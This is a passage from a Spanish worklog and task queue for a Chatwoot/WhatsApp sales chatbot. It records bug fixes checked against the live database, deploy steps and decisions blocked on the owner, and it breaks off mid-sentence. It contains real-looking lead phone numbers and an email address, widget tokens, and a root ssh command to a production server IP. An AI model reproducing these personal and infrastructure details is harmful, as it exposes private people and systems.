- [x] 🔴 **"Hasta entonces el bot dice la verdad" era FALSO por un tercer camino — y el placeholder
      SÍ salió a producción.** Lo de arriba tapó el saludo (`M0_SIN_HORARIOS`) y la re-oferta
      (`M0b_SIN_HORARIOS`), pero quedó vivo el de la **re-pregunta**. Medido en la base, no leído
      — `message_type=1`, conv 49: a las **21:09 UTC** *"¿En qué horario te viene mejor que te
      reserve, horario A o horario B?"* y a las **23:03** *"en la opción A o en la B"*.
      **Por qué las guardas no lo vieron:** buscan el literal `pendiente de definir`, y estos dos
      son **paráfrasis del LLM**. `hermes-content/deploy/vps-ops/bot/bot-engine.mjs:786` le pasa `pendingAsk` al modelo como
      `pendingQuestion`; el modelo recibió los dos labels y los reescribió. La misma frase salía
      además literal por `hermes-content/deploy/vps-ops/bot/bot-engine.mjs:440`. Reproducido:
      `pendingAsk({botStage:"esperando_horario", slotsOffered:[]}, DEFAULT_CONFIG)` →
      *"¿Te reservo **HORARIO A (pendiente de definir)** o **HORARIO B (pendiente de definir)**?"*.
      **El tercer turno YA estaba testeado** — pero sólo por `replies.length >= 1`, o sea "¿habla?"
      y nunca "¿qué dice?". Los dos turnos anteriores sí miran el texto; el agujero quedó justo
      donde el guion cae a `pendingAsk`.
      **Arreglado** con `PENDING_HORARIO_SIN_HORARIOS`, elegida por el flag `pending` de cada slot
      (`hayHorarioReal`), que tapa el camino determinista y el del LLM de una sola vez.
      **Intento fallido que vale anotar:** el primer arreglo fue en `activeSlots`, distinguiendo
      `[]` de sin-definir. Es la causa más limpia, pero rompió `hermes-content/deploy/vps-ops/bot/followup-run.test.mjs:462` — ese
      fallback a `config.slots` está **documentado y es deliberado**, porque lo comparte una ruta
      de plantillas de WhatsApp **pagas**. Revertido: el arreglo va en el punto de la fuga, no en
      la semántica compartida. **721/721 verdes**, test nuevo rojo antes por el motivo correcto.
      ⚠️ **Commiteado, NO desplegado** — `/opt/onia/bot` es rsync, no git.

- [x] ~~🔴 **El bot contesta el saludo y se calla en el SEGUNDO mensaje. Reproducido hoy, en vivo, en el inbox de los leads reales.**
      **Cómo se reproduce** (30 segundos, sin tocar nada): abrir
      `https://onia-chatbot-chatwoot.hqdqgh.easypanel.host/widget?website_token=9k5i7xnAgCbSse1EZwVChZLw`,
      escribir *"Hola, quiero informacion sobre el sistema"* → **contesta bien**; después
      *"Tengo una clinica dental en Santa Cruz, somos 4 personas"* → **nada, nunca**.
      **No es infraestructura.** Medido: `/health` dentro de `onia-center` da `ok:true`, base a
      32 ms, el camino a Chatwoot responde, el webhook está registrado en la cuenta 2 sin filtro
      de inbox (o sea que cubre el 4), y no hay incidente abierto.
      **Tampoco es el add-on.** Se probó la hipótesis y salió FALSA: se le otorgó
      `addon.whatsapp` a `onia-interna` (activo, verificado en `organization_entitlements`) y el
      bot se sigue callando igual. Queda otorgado.
      **El patrón, contado sobre las 13 conversaciones desde el 24-ago:** en el inbox 7 (QA) el
      bot sostuvo una charla entera (5 mensajes → 5 respuestas). En los inboxes 4 y 5 —los de
      leads reales— contestó **como máximo UNA vez, siempre**: 1→0, 1→0, 2→0, 1→0, 1→1, 2→1,
      2→1, 2→1. Nunca hubo una segunda respuesta a una persona real.
      🔴 **Lo primero es VERLO, no adivinarlo.** `/tmp/onia-bot-webhook.log` sólo tiene líneas de
      arranque: **ni una por mensaje**. El proceso corre con `docker exec -d`, así que su salida
      no va a ningún lado. Por eso este bug sobrevivió una semana con cinco personas escribiendo.
      **Antes de tocar el motor: que cada webhook deje una línea** con conversación, entrada, la
      rama que tomó y por qué no respondió. Con eso la causa aparece en la primera vuelta; sin
      eso se sigue adivinando.
      ⚠️ **Ojo con dar por buena una hipótesis sin probarla**: la del add-on parecía cerrada y era
      falsa. La conversación de prueba de hoy queda en el inbox 4 a propósito, para reproducir.
      **Evidencia del arreglo de la traza:** vive en
      `hermes-content/deploy/vps-ops/bot/webhook-server.mjs` y la cubren tres tests de
      `hermes-content/deploy/vps-ops/bot/webhook-server.test.mjs` (lineas 688, 701 y 726).

- [x] **El bot del CLIENTE escribe el nombre de su encargada en minúscula a mitad de frase.**
      Abierto el 2026-09-03 al recorrer el circuito de conocimiento (tablero `t_ff51abdc`).
      Lo ve el cliente del cliente, en la primera respuesta.
      ✅ **ARREGLADO el 2026-09-03 — commiteado, NO desplegado** (ver el punto de deploy al final).

      **Reproducción exacta (30 s), ya medida en vivo:**
      ```
      ONIA_WIDGET_TOKEN=vsB37FKgVPH2wWxkCZunUNsf \
      ONIA_SONDA_ESTADO=/root/.onia/sonda-widget-qa7.json \
      node scripts/sonda_widget.mjs
      docker exec onia-chatbot_chatwoot-db.1.nhgizxt2v01lnhebx9jtdwm5q \
        psql -U postgres -d onia-chatbot -tAc \
        "select message_type, content from messages where conversation_id=51 order by id;"
      ```
      Devuelve, textual: `_(Estoy respondiendo automático fuera de horario de oficina.`
      **`la encargada`** `te confirma en la mañana.)_`

      **Causa, en un solo punto.** `renderTemplate()`
      (`hermes-content/deploy/vps-ops/bot/config.mjs:653`) sustituye `{{humano}}` por el valor
      crudo de `identity.humanName` del conocimiento de la org. Con el humano de Onia el valor es
      un nombre propio (`Sergio`) y nunca se notó; el conocimiento de un cliente trae un **cargo
      en minúscula** (`la encargada`), y hay **cuatro plantillas donde `{{humano}} cae al empezar
      una oración**: `config.mjs:100`, `:166` (después de `.`), `:264` (M7) y `:313`.

      **El arreglo, tal como quedó.** `renderTemplate` usa el `offset` que ya le da el callback
      de `replace`: si lo anterior está vacío o termina en `.`/`!`/`?`/salto de línea, capitaliza
      la primera letra del valor **sólo si es minúscula**. Con `:` NO — `"Anotado: {{datos}}"` va
      en minúscula en castellano, y ese caso es el que separa la regla de un `toUpperCase` a lo
      bruto. **La regla mira el offset y no la clave a propósito**: atarla a `humano` dejaría el
      mismo defecto vivo en la próxima plantilla que alguien escriba.
      **Rojo primero, por el motivo correcto:** `config.test.mjs` (nuevo, 11 casos) salió **5
      fallando** con el texto del bug en la salida —
      `"…demo.\n\nla encargada te coordina el horario…"` — y los 6 guardarraíles (mitad de frase,
      `:`, nombre propio, viñeta, `**negrita**`, clave sin valor) verdes desde el principio.
      Después del arreglo: **11/11**, y la suite entera del bot **744/744**.

      🔴 **Y era más ancho de lo que decía el reporte: NO es sólo el cliente que puso "la
      encargada".** `knowledge.mjs:860` pone como fallback `humanName: "el equipo"` cuando el
      cliente no cargó humano — también minúscula. O sea que **todo bot de cliente sin humano
      cargado** mandaba `"…fuera de horario de oficina. el equipo te confirma…"`. Medido por el
      camino real (`reply-builder.say`, no el helper suelto), las tres variantes hoy:
      `la encargada` → `"…oficina. La encargada te confirma…"` · `el equipo` → `"…oficina. El
      equipo te confirma…"` · `Sergio` → intacto.

      ⚠️ **Es el repo `onia-hermes`, no `onia-platform`**: los gates son los de este árbol
      (`cd hermes-content/deploy/vps-ops/bot && node --test` → 744/744), y **commitear no lo
      despliega** — `/opt/onia/bot` es rsync, no un checkout. **Hasta que se sincronice
      `config.mjs`, producción sigue mandando el cargo en minúscula.** El deploy lo hace
      `onia-cola` con OK de Sergio; se verifica con la misma reproducción de arriba, exigiendo
      `La encargada` en la conversación nueva.

## Después

- [x] ✅ **CERRADO el 2026-09-12 03:48 UTC — la sonda ya cierra su propia conversación al
      terminar, y la bandeja de leads reales quedó limpia. Verificado en vivo, no por el código.**
      El arreglo (`2a6b6389`, `scripts/sonda_widget.mjs`) estaba commiteado desde la vuelta
      anterior pero **su LISTO exigía dos corridas seguidas y nadie las había corrido**: eso es
      lo que se hizo acá.

      **La prueba, releyendo la base después de cada corrida** (`conversations` del inbox 4,
      por `docker exec … psql`): corrida 1 → `EL BOT CONTESTO LOS 2 — conversacion 49`, y la
      conv 49 quedó `status=1` (resolved); la lista de ABIERTAS del inbox 4 quedó en **los 4
      desconocidos reales y nada más** (48, 40, 36, 34), sin una sola «Sonda QA». Corrida 2 →
      mismo resultado. Durante la corrida la 49 se ve `status=0`: la sonda escribe y reabre,
      y **por eso el cierre va en `finally`** (`correrConCierre`), no en el camino feliz.
      Gates: `node scripts/sonda_widget.mjs --self-check` → **42/42 en verde**, con los seis
      casos que fijan justo esto («EL BUG: con el bot en `nuevo` no habia NINGUN camino que
      cerrara», «cierra aunque el veredicto sea 1 (bot mudo)», «cierra aunque la medicion
      TIRE», «sin deps inyectadas TIRA, en vez de escribir en produccion»).

      ⚠️ **Lo que sigue valiendo:** el rastro *«marked resolved by system due to 0 minutes of
      inactivity»* lo escribimos NOSOTROS con ese cierre — **no** configurar `auto_resolve_after`
      de Chatwoot para «mejorarlo», porque eso enciende un barrendero que hoy no corre y se
      llevaría puestos los leads reales. Y el cierre NO cambia lo que la sonda mide: la corrida
      siguiente la blanquea igual al arrancar.

      <details><summary>Cómo se midió el bug original (11-sep)</summary>

      Medido el 2026-09-11 en `conversations` del inbox **4** (el de los
      desconocidos de la web), no deducido: la conv **49** («Sonda QA carril chatbot») llevaba
      **338 mensajes entrantes / 333 salientes** —la sonda reusa la misma conversación desde el
      2-sep— y estaba **`status=0` (open) con el `last_activity_at` más reciente de todo el
      inbox**. Chatwoot ordena por esa columna: cada corrida del loop (`13,43 * * * *`) la
      devolvía al tope, y los cuatro desconocidos reales quedaban debajo de **cinco** sondas —
      entre ellos la **34** (1 mensaje, 0 respuestas, 24-ago) y la **36** (2 mensajes, 0
      respuestas, 27-ago), que son justo los que S7 dice que Sergio Urcullo tiene que contestar.
      Un carril cuyo objetivo es *«que un desconocido escriba y esa conversación SE VEA en la
      bandeja»* se estaba tapando a sí mismo la bandeja con su propio instrumento.

      **La causa está localizada:** `scripts/sonda_widget.mjs` resuelve la conversación **al
      arrancar** y sólo si hace falta (`dejarComoExtrano` → `desarmar`, y `necesitaDesarme()`
      devuelve `false` salvo handoff). En el camino feliz —el bot contesta los dos— **nadie la
      cierra al terminar**, así que la sonda siempre termina dejándola abierta.

      ✅ **Barrido ya hecho (2026-09-11 20:48 UTC), sólo lo propio y por id exacto:** resueltas
      las 6 que ensucian —45, 46, 47, 49, 50 y la 10 («Visitante Prueba Web»)— por `rails runner`
      con guarda `inbox_id == 4`. **Verificado releyendo la base:** la lista de ABIERTAS del
      inbox 4 quedó en **los 4 desconocidos reales y nada más** (48, 40, 36, 34). No se tocó
      ninguna conversación de persona real.

      El **LISTO** que se fijó ese día —y que esta vuelta cumplió— era: dos corridas seguidas de
      `npm run sonda:widget` dejan la conv de sonda en `resolved` y la bandeja de abiertas del
      inbox 4 sin una sola «Sonda QA».

      </details>

      📌 **La lección, que vale para cualquier instrumento del sistema:** el barrido a mano del
      11-sep dejó la bandeja limpia y *parecía* el arreglo; no lo era, porque la sonda volvía a
      ensuciarla 30 minutos después. **Preparar el sujeto al arrancar no es devolverlo al
      terminar** — toda sonda que siembre en producción cierra lo suyo en `finally`, o el
      barrido hay que repetirlo para siempre.

- [ ] **Limpieza de la data QA NUEVA.** La del 29-ago ya se ejecutó; después se generó más:
      las conversaciones QA 39, 43 y 44 (`Cliente Prueba Bandeja`, `Cliente Insistencia Tres`,
      `Cliente Comprobante`). **No borrar todavía**: son la evidencia de cuatro ítems cerrados,
      igual que las dos orgs que el carril de producto decidió NO borrar por el mismo motivo.
      Se limpia cuando haya conversaciones reales que las reemplacen como prueba.

      ⚠️ **Corregido 2026-09-01, auditando el ítem contra la base de HOY (no contra el
      texto): la org `zzqa-horario-0001` ("ZZ QA Horario") es un fantasma — nunca existió.**
      `public.organizations` tiene hoy sólo las cuatro de siempre (`Onia (interna)`,
      `Bolivian electricidad`, `ZZ QA Clinica Chatbot`, `ZZ QA Ferreteria Tornillo`); ninguna
      con slug u org nueva de "horario". Tampoco hay un quinto inbox en Chatwoot (siguen
      siendo 3, 4, 5 y 7) ni un usuario con ese correo en `auth.users`. Las tres
      conversaciones SÍ son reales y SÍ están en `inbox_id=7` — pero es el inbox de la org
      que ya existe, `ZZ QA Clinica Chatbot`, no uno nuevo. No cambia lo que hay que hacer
      (seguir sin borrar), sólo corrige el dato falso para que nadie busque una org que no
      está.

- [ ] **Botón "Cobrar con QR" dentro de la conversación** (pieza 5 del backlog v5). El
      circuito está completo en mock y verificado mirando (`/bcp/cobrar` + `/bcp/callback`,
      contrato del banco calcado); el código no cambia para el modo real. Espera las
      credenciales del BCP — ver Bloqueado.
- 📌 **Nota para el carril web-factory (no la ejecuta este carril):** tres de las frases de
  `site.ts` dicen *"avisen cuando Onia para comercio/servicios/importadoras esté listo"*, y
  eso es **exhibir obra en la superficie de venta** — prohibido por CLAUDE.md §3. Además los
  tres rubros ya se venden. Anotado acá para que no se pierda; lo decide su dueño.
  **2026-08-31, dato nuevo que simplifica la decisión:** los cuatro exports —
  `WA_TEXT_COMERCIO`, `WA_TEXT_SERVICIOS`, `WA_TEXT_PROVEEDORES` y `WA_URL`— **no los importa
  nadie** en todo `web-factory/` (verificado por grep en el repo y por `curl` contra las páginas
  vivas: ninguna los renderiza). No hay texto que corregir: es código muerto, y `WA_URL` dice de
  sí mismo ser "el CTA general de toda la página", así que probablemente se desconectó sin
  querer. Dos caminos, los dos baratos: borrarlos, o volver a conectar `WA_URL`.

---

## Bloqueado en Sergio

> Ninguno de estos frena la cola: se anota, se avisa y se sigue con el próximo desbloqueado.

| # | Qué | Por qué sólo él | Qué desbloquea |
|---|---|---|---|
| S1 | **Probar el popup de Embedded Signup con un +591 real** (`chat.onia.com.bo` → Add Inbox → WhatsApp → Connect with WhatsApp Business) | Necesita su sesión de Meta y un chip. Todo lo nuestro está hecho desde el 28-ago: Access Verification ✅, Configuration ID `1824225392073753`, dominio JS SDK autorizado, las 3 InstallationConfigs cargadas | Que un CLIENTE conecte su propio WhatsApp solo. ⚠️ Hoy el inbox que nazca queda huérfano — ver ítem 2 de Ahora |
| S2 | **Credenciales del BCP + certificado mTLS (`.pfx`)** | Trámite bancario | El botón "Cobrar con QR" en la conversación. Sin banco no hay código que lo destrabe |
| S3 | **Traslado del 75414930 a coexistencia** — OK explícito ("vamos con A") + ventana acordada + el PIN de dos pasos a mano | El número queda MUDO 30-60 min y el rollback depende de un PIN que sólo él tiene. Runbook completo: `hermes-content/docs/ONIA_RUNBOOK_COEXISTENCIA_75414930.md` | Que Sergio siga usando su app de WhatsApp en el mismo número que atiende el bot |
| S4 | **Verificar el push "te escribieron" en su celular** (suscribirse y recibir) | Hace falta un dispositivo real | El circuito está testeado 95/95 y deployado; sólo falta la prueba física |
| S5 | **¿Silenciar el Telegram de los agentes n8n que sí trabajan?** (Vendedor, Contenido, Finanzas, Prospector, Radar IA, Web Factory Radar) + los recordatorios de agenda cada 30 min | Es su canal y su umbral de ruido. No se apagan los workflows: hacen trabajo — hay que editar el nodo de aviso de cada uno | Que Telegram vuelva a ser sólo errores, que es la regla que ya se aplicó al resto |
| S7 | **Contestar (o descartar) a los cuatro desconocidos que escribieron y nadie respondió** — conv 35 (+591 73232758, clínica dental de 4 doctores, 25-ago), 37 (+591 73021804, 28-ago), 36 (`Saguilera@ds-santacruz.bo`, 27-ago) y 34 (widget, sin dato de contacto) | Vende Sergio, y son personas reales esperando desde hace 3-6 días. Un bot no puede retomar una conversación fría de hace una semana sin que suene a spam | El primer lead atendido del carril. Dos tienen número de WhatsApp y uno correo: tres de los cuatro son alcanzables hoy |
| ~~S8~~ | ✅ **CERRADO el 2026-08-31: `Onia (interna)` → inbox 5.** Verificado en la base y MIRADO en `/inbox`. **Podado el 01-sep:** esta fila arrastraba el análisis completo de seis vueltas y seguía leyéndose como bloqueo vivo — S8 se nombra **17 veces** en este archivo, casi todas dentro de párrafos viejos que ya no aplican. Lo que quedaba abierto NO era S8 sino el **inbox 4**, y ahora tiene su propio ítem (3 de "Ahora") y su propio bloqueo (**S14**). | — | — |
| S9 | **Publicar las campañas en el VPS — y son CUATRO archivos, no uno.** 🔴 **Corregido el 31-ago (3ª vuelta): tal como estaba escrito, esto NO encendía nada.** Decía copiar sólo `campanas-onia.knowledge.json` a `/opt/onia/bot/knowledge.json` porque daba el motor por desplegado; medido con md5, el VPS está **un commit atrás** (`3e3841aa`, sin `994eb42d`) y su `bot-engine.mjs` tiene **cero `campanaExacta`** — habría ignorado las campañas en silencio. Lo que tiene que viajar: **`bot-engine.mjs` + `knowledge.mjs` + `run-turn.mjs`** (del espejo `hermes-content/deploy/vps-ops/bot/`) **+ `knowledge.json`** (desde `hermes-content/docs/chatbot/campanas-onia.knowledge.json`), y después **reiniciar** — `webhook-server.sh` sólo recopia al contenedor si cambia su STAMP. Verificar con `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` (tiene que salir 0) | Escribe en el VPS, y la regla dice que ningún deploy sale sin su OK | **El ítem 2 entero.** El motor del repo ya las lee en modo venta (**647/647 verde**, probado con este mismo documento); falta que el VPS TENGA ese motor y que el archivo del número traiga las campañas. ⚠️ **Sumado el 31-ago (4ª vuelta): `run-turn.mjs`**, que volvió a exportar `LLM_SYSTEM_PROMPT` para revivir los 12 evals. Corrido hoy contra producción, `espejo-check.mjs` sale **1**: DISTINTOS `bot-engine.mjs`, `bot-engine.test.mjs`, `knowledge.mjs`, `run-turn.mjs`, `run-turn.test.mjs`; FALTAN `campanas-web.test.mjs`, `espejo-check.mjs`, `espejo-check.test.mjs`, `recepcionista.test.mjs`. Sin esto las 4 frases vivas de onia.com.bo siguen recibiendo el saludo genérico. ✅ **Gate 1 del 31-ago (5ª vuelta): EL CÓDIGO YA VIAJÓ — S9 se achicó a UN archivo de datos.** Medido, no leído: `espejo-check.mjs` sale **0** (`ESPEJO OK`), o sea que `bot-engine.mjs`, `knowledge.mjs` y `run-turn.mjs` ya son los del repo. Y confirmado en el motor que **CORRE**, no en el host: `docker exec onia-center grep -c campanaExacta /tmp/onia-bot/bot-engine.mjs` → **2** (era 0). Lo único que falta es el documento: `/opt/onia/bot/knowledge.json` sigue en **904 bytes del 6-ago, con cero `campanas`** — dentro y fuera del contenedor. **S9 hoy = copiar `hermes-content/docs/chatbot/campanas-onia.knowledge.json` a `/opt/onia/bot/knowledge.json` y reiniciar.** 🔴 **CORREGIDO el 31-ago (9ª vuelta): ya NO alcanza el JSON solo — son TRES archivos, y hacerlo con uno EMPEORA producción.** El documento nuevo trae `prefijo` (la campaña del CTA de `/v1/empezar`), y el esquema del validador **rechaza claves desconocidas**: `parseKnowledge` devuelve `data: null`, o sea que el documento **no carga a medias, no carga nada**. Medido con el `knowledge.mjs` que HOY corre en el VPS, bajado por `scp`: `ok=false`, `campanas[4].prefijo: clave desconocida`. Copiando sólo el JSON no quedan 5 campañas de 6 — quedan **cero**, y encima se pierden la FAQ `siat` y el horario que hoy sí están vivos. **Lo que tiene que viajar junto:** `hermes-content/deploy/vps-ops/bot/knowledge.mjs` + `hermes-content/deploy/vps-ops/bot/recepcionista.mjs` + el documento a `/opt/onia/bot/knowledge.json`, y reiniciar. Verificación previa: `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` hoy sale **1** y nombra `knowledge.mjs` y `recepcionista.mjs` entre los DISTINTOS — después del `scp` tiene que salir **0**. ✅ **Sumado el 31-ago (6ª vuelta) — verificado que la copia es SEGURA, que era un riesgo sin medir.** La instrucción manda a **sobrescribir un archivo de datos vivo en producción** y nadie había comparado los dos lados: si el documento nuevo no traía algo que el viejo sí, el `scp` lo borraba en silencio. Bajado el vivo del VPS y diffeado campo por campo contra el del repo: `identity`, `empresa` (el horario lun-vie 9-18) y `triggersExtra` son **idénticos**, y la única FAQ (`siat`) es **byte a byte la misma**. El nuevo sólo agrega `campanas` (5) y sube `version` de `2026-08-06.1` a `2026-08-31.1`. Es un **superset estricto**: no se pierde nada. **Y cómo se comprueba DESPUÉS del scp** — porque este carril ya dio dos deploys por hechos sin mirarlos, y hay que medirlo en el motor que CORRE, no en el host:
  ```bash
  ssh root@187.77.16.63 "docker exec onia-center sh -c 'grep -c campanas /tmp/onia-bot/knowledge.json'"
  ```
  Tiene que dar **≥1**. Hoy da **0** dentro y fuera del contenedor (904 bytes del 6-ago), que es el estado sin S9. (Se suma al mismo `scp` `recepcionista.test.mjs`, que dejó de ser un archivo de 0 bytes — es un test, no cambia lo que corre.) ✅ **Sumado el 31-ago (10ª vuelta) — verificación PREVIA, que antes no existía:** `npm run campanas:vivas` mide **desde la calle** que el documento cubra las frases que onia.com.bo manda **hoy**. Si sale 1, el `scp` publicaría un documento que ya no matchea y no hay que hacerlo. Corrido hoy: **0** (5 de 5 cubiertas). No reemplaza al `grep -c campanas` de después — ese mide el VPS, este mide el documento. 🔴 **CORREGIDO el 2026-09-02 (auditoría de los `[x]`): S9 volvió a quedar corto, y hacerlo como dice HOY deja el motor llamando a una función que no existe.** Desde que se escribió "viajan TRES archivos", el espejo sumó una feature entera —el bot manda el link de la agenda pública de la org en vez de derivar— repartida en **cinco** archivos. Medido contra `/opt/onia/bot` real, no leído: `espejo-check` nombra ahora `config.mjs`, `intents.mjs` y `preview-route.mjs` **además** de `knowledge.mjs` y `recepcionista.mjs`. Y el acople es duro: el `recepcionista.mjs` del espejo llama a `intents.wantsToBook()` y a la plantilla `R_AGENDA`, y **ninguna de las dos existe en el VPS** (su `intents.mjs` exporta `wantsToOrder` pero no `wantsToBook`; su `config.mjs` tiene cero `R_AGENDA`). Probado ejecutando, no por grep: copiado el subconjunto que S9 mandaba a un `/tmp` con el resto del VPS, `intents.wantsToBook` da `undefined` y llamarlo tira `TypeError: intents.wantsToBook is not a function`. **La lista vigente de S9 = `bot-engine.mjs`(ya en sync) + `config.mjs` + `intents.mjs` + `knowledge.mjs` + `preview-route.mjs` + `recepcionista.mjs` + el documento `knowledge.json`** — y la manda el gate, no este párrafo: `espejo-check.mjs` ahora imprime `VIAJAN JUNTOS` con los acoples calculados en vivo. Correr el gate ANTES del `scp` y copiar lo que diga; esta lista envejece, la del gate no. **Verificador:** `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` → 0 |
| S10 | **Aplicar al VPS la defensa ampliada de la marca de Chatwoot** — `scp` de `hermes-content/deploy/vps-ops/chatwoot-brand-onia.sh` a `/root/bin/` y una corrida manual. Repara **DIEZ** `installation_configs` que Chatwoot reconcilia solo (`Internal::ReconcilePlanConfigService`, leído del YML del propio contenedor): el cron que hoy corre (`/root/bin/chatwoot-brand-onia.sh`, cada hora al minuto :17) sólo reaplica 3 de las 9 que le tocan (DISPLAY_MANIFEST queda afuera a propósito: su valor de fábrica es el que se quiere) | Reemplaza un cron que corre solo cada hora: es infra, y la regla del carril dice que el VPS es suyo | Que `BRAND_URL`, `TERMS_URL` y `PRIVACY_URL` dejen de decir `www.chatwoot.com` en el HTML público del login. Se mide **desde la calle, sin VPS ni SSH**: `npm run marca:chatwoot` (`hermes-content/deploy/vps-ops/chatwoot-marca-publica.mjs`, 8 tests) lee `window.globalConfig` del login público — antes de que existiera este gate, la reversión del 16-ago vivió quince días sin que nadie la viera, porque el único chequeo vivía dentro del contenedor. **Re-verificado en vivo el 2026-09-02: sigue en `REVERTIDAS 3/9`, exit 1**, sin cambio desde el 16-ago (ya se vigiló así ocho vueltas seguidas entre el 31-ago y hoy, siempre con el mismo resultado). **Después del `scp` y la corrida manual, tiene que salir 0.** **Verificador:** `npm run marca:chatwoot` → 0 |
| S11 | **Desplegar el producto para que el sidebar deje de mostrar `ASSIGNMENT_TURNED_IN` en letras gigantes.** El arreglo es el commit **`22fd088`** de `onia-platform`, rama `claude/chatbots-platform-review-0d1d09`. ✅ **Ya está en `origin/master`** desde el merge `503af44` (2026-09-02 12:38 UTC), así que **el deploy hoy SÍ lo alcanza** — durante horas esta fila decía lo contrario y por eso no se destrababa. **Falta sólo el swap**, y el defecto sigue vivo en producción: el contenedor `onia-platform` lleva 15 h arriba (anterior al merge) y su build todavía tiene `assignment_turned_in` — medido con `docker exec … grep -rl` sobre `/app/.next`, no leído. Esta fila se quedó corta tres veces (el commit no existía · existía sin mergear · mergeado pero la fila decía que no); por eso la lista ya no la mantiene este párrafo: `npm run deploy:alcanzable` se lo pregunta a git, y hoy sale **0**. **Y desde el 2026-09-02 esta fila se comprueba sola: `npm run s11:desplegado` le pregunta al contenedor `onia-platform` del VPS —el que CORRE, no el host ni el repo— con qué icono dibuja hoy la entrada `/requerimientos` de su build publicado. Hoy sale 1 nombrando `assignment_turned_in`; el día que Sergio haga el swap sale 0 y `npm run bloqueos:vencidos` levanta la fila solo, sin que nadie se acuerde de mirar. **Verificador:** `npm run s11:desplegado` → 0** | Es un deploy del producto, y ningún deploy sale sin su OK | Que el ítem "Requerimientos" del menú dibuje su icono. 🔴 **CORREGIDO el 2026-09-02 (auditoría de los `[x]`): esta fila mandaba a desplegar un commit que NO EXISTE.** Decía *"commit `4f86381` (rama `carril/chatbot-v68-friccion`)"* y *"ya arreglado y con su guardia en la suite (`scripts/iconos-en-la-fuente.test.ts`)"*. Medido, no leído: después de `git fetch --all --prune` contra GitHub, `git log 4f86381` da `unknown revision`, **no hay ninguna rama** que matchee `friccion` ni `v68` en las 39 remotas, y el archivo del guardia **nunca fue agregado en ninguna rama**. Ese trabajo quedó en el disco de Windows y nunca se pusheó. Un bloqueo que le pide a Sergio desplegar la nada es peor que un fantasma: no se destraba nunca. **El defecto SÍ era real y seguía vivo**, verificado RENDERIZANDO el `.woff2` que se publica (Chromium, no grep): `assignment_turned_in` mide **20em** —el texto crudo— contra **1em** de los otros 34 iconos del menú. Causa medida: el icono entró el 30-ago (`ab9e0de`) y la fuente subseteada es del 29-ago (`917adca`), así que el glifo nunca viajó; y `scripts/subset-iconos.mjs`, que corre dentro del `build`, **se rinde en silencio y sale 0** si falta `pyftsubset` (reproducido acá). **Rehecho de cero en `22fd088`:** el ítem usa `task_alt`, que ya está en el subset (no depende de que exista Python en el entorno de build), más el gate `npm run gate:iconos` (`scripts/iconos-en-la-fuente.mjs`) que renderiza los 35 iconos declarados contra la fuente publicada **sin sesión ni app levantada** — el hueco exacto por el que se coló, ya que `e2e/iconos.spec.ts` sólo mira `/`, `/login` y `/register`. Rojo por el motivo correcto antes, verde después (35/35). Gates: `tsc` limpio · **2441** tests · `eslint` 0 errores. **Verificación post-deploy:** abrir `/inbox` y mirar el menú — el ítem "Requerimientos" tiene que dibujar un tilde, no una palabra |
| S12 | **Los DOS horarios fijos de demo — sin ellos el bot deriva a un humano en el primer mensaje y se calla para siempre.** Son dos bloques semanales de SU agenda; `hermes-content/deploy/vps-ops/bot/config.mjs` los trae `pending: true` con un TODO que dice *"PROHIBIDO inventar horarios acá"*. **Contexto nuevo del 01-sep:** existía la salida automática por Cal.com y **está muerta** — no hay contenedor de Cal.com en el VPS y `cal.onia.com.bo` responde 302 a `onia.com.bo/empezar`, así que el módulo cae al placeholder en silencio. **Dos opciones, las dos baratas:** (a) Sergio dicta dos bloques fijos (ej. martes 10:00 y jueves 16:00) y quedan como dato — cero código; (b) revivir Cal.com, que es infra y cuesta más. Recomendación: **(a)**, y (b) después si molesta mantenerlos a mano | Son horas de su semana, y el código prohíbe inventarlas | **El ítem 1 de Ahora, que es el único defecto que un comprador ve.** Probado corriendo el motor con dos horarios cualesquiera: el embudo llega hasta `M2` demo agendada sin tocar una línea de código |
| S13 | **Encender el aviso `notify_sergio`** — hoy el bot pide un humano y no se entera nadie. ⚠️ **NO es "poner `ONIA_N8N_ENABLED=true`"**: `ONIA_N8N_EVENT_URL` está **vacío** y **no existe ningún workflow de n8n** que reciba el evento (listados los 44). Con la variable en `true` y sin URL el envío devuelve `failed` y **nadie se entera**, porque es fire-and-forget a propósito. **Decidir el camino:** (a) Telegram directo desde el bot, reusando el `TG_BOT_TOKEN` que `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh` ya usa en el VPS — sin workflow, sin URL, sin secreto nuevo; (b) crear el workflow de n8n y cargar la URL. Recomendación: **(a)** | Escribe en el VPS. El código lo escribe este carril; la decisión y el deploy son suyos | El ítem 2 de Ahora. Gate barato antes de mirar el celular: `"configurado":true` en el `/health` del bot |
| S14 | **De quién es la bandeja del widget (inbox 4)** — hoy no tiene org, y por ahí entraron **SEIS** conversaciones de desconocidos (34, 36, 38, 40, 45, 46), dos de ellas del 01-sep. **Cinco de las seis no dejaron teléfono ni correo**: sólo se les puede contestar desde adentro del widget, que es exactamente lo que el inbox huérfano impide — o sea que un inbox sin dueño no es una demora, es una pérdida. ⚠️ **A diferencia de S8, no alcanza con dos clicks:** está cerrado en esta cola que **una org sólo puede tener UN inbox** (`clinic_settings.chatwootInboxId`, `prisma/schema.prisma:1002`), y `Onia (interna)` ya gastó el suyo en el 5. ⚠️ **Corregido el 2026-09-02:** acá decía que esa columna era *"un `Int?` **único**"* y es falso — medido, no leído: no tiene `@unique` ni hay `@@unique` en `ClinicSettings`. Lo cierto de la frase es la mitad que importa para esta decisión (una org tiene UN inbox, porque es una columna escalar); lo que NO garantiza nadie es el otro sentido — **la base acepta que dos orgs reclamen el mismo inbox**, y el 409 que lo impide vive sólo en el PATCH de superadmin. No cambia las tres opciones de abajo, pero sí descarta "la base no me deja" como argumento. Desde hoy lo vigila `npm run inbox:tenencia`. **Opciones ya cotizadas en `ONIA_RADAR_DECISIONES_PRODUCTO.md` §9:** (a) darle el inbox 4 a otra org existente — cero código, pero mezcla el widget de Onia con una org que no es Onia; (b) crear una org `Onia (web)` sólo para el widget — cero código, ~10 min, agrega una org fantasma; (c) extender `clinic_settings` a N inboxes, que es código del producto y de otro carril. Recomendación: **(b)**. 🔁 **Fusionada el 2026-09-02 con la fila que la tabla listaba aparte bajo un SEGUNDO `S12`** (*"¿sigue en pie la opción 1 de §9?"*): era la **misma decisión preguntada dos veces**, con dos números distintos y uno de ellos ya usado por los horarios de demo. Lo destapó `npm run bloqueos:vencidos` al imprimir `S12, S12` — el gate nombra las filas por su id, así que un id repetido lo vuelve ambiguo. El dato fresco que aportaba esa fila (seis 